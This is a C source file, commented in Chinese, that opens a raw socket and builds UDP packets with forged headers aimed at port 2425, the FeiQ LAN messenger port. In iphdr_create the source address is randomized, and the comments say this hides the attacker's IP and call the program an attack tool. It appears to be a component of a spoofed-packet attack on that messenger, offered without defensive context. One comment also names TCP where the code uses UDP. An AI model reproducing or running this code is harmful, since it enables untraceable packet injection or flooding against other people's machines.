#include "rawsock.h"

int rawsock_create(){
	int     rawfd;  
    const int on=1;
    //!> 建立套接字  并且指定为IPPROTO_TCP的原始套接字
    if( ( rawfd = socket( AF_INET, SOCK_RAW, IPPROTO_UDP) ) == -1 )  
    {  
        printf("Socket Error...\n");  
        return -1;
    }  
  //开启IP头部的更改，由用户自行封装IP报文  
    if( ( setsockopt(rawfd, IPPROTO_IP,IP_HDRINCL,&on, sizeof(on)) ) == -1 ) 
    {
          printf("setsockopt Error...\n");  
		  return -1;
    }
	return rawfd;
}

void rawsock_close(int rawfd){
	close(rawfd);
}

void udpdata_create(char *buf,const char *data,char *dstip,struct sockaddr_in *dstaddr){
	struct ip *ip_header = NULL;
	struct udphdr *udp_header = NULL;
	int iplen,udplen,datalen;
	datalen = strlen(data);
	iplen = IPHDRLEN+UDPHDRLEN+datalen;
	udplen = UDPHDRLEN + datalen;
	ip_header = (struct ip*)buf;//分配空间
	udp_header = (struct udphdr*)(buf+IPHDRLEN);
	iphdr_create(ip_header,dstip,UDPTYPE,iplen,dstaddr);
	udphdr_create(udp_header,udplen);
	//把数据拷贝到数据包缓冲区中
	memcpy(buf+IPHDRLEN+UDPHDRLEN,data,datalen);
}
static void iphdr_create(struct ip *ip_header,char *dstip,int type,int iplen,struct sockaddr_in *dstaddr){
	bzero(dstaddr,sizeof(struct sockaddr_in));
	//ip头部填充
	ip_header->ip_v=IPVERSION; //版本号
	ip_header->ip_hl=sizeof(struct ip)>>2; //ip 头部长度
	ip_header->ip_tos=0;
	ip_header->ip_len=htons(iplen);
	ip_header->ip_id=0;
	ip_header->ip_off=0;
	ip_header->ip_ttl=MAXTTL;
	ip_header->ip_sum=0;
	if(type == UDPTYPE)
		ip_header->ip_p=IPPROTO_UDP;
	ip_header->ip_src.s_addr = random();//这里为了隐藏攻击者的ip地址采用了随机数，事实上这并不符合
	//要写一个通用型框架的标准,但是为了方便，就把这边写死了吧，
	//写的过程中也发现了类似于这样的攻击程序并不适合这样的设计思想
	//这样子会造成大量的时间浪费
	inet_pton(AF_INET,dstip,&dstaddr->sin_addr);
	ip_header->ip_dst = dstaddr->sin_addr;
}
static void udphdr_create(struct udphdr *udp_header,int udplen){
   udp_header->source = htons(2425);//写死,飞秋端口使用2425
   udp_header->dest = htons(2425);
   /* 这里的长度是整个UDP报文 */
   udp_header->len = htons(udplen);
   udp_header->check = 0;
}

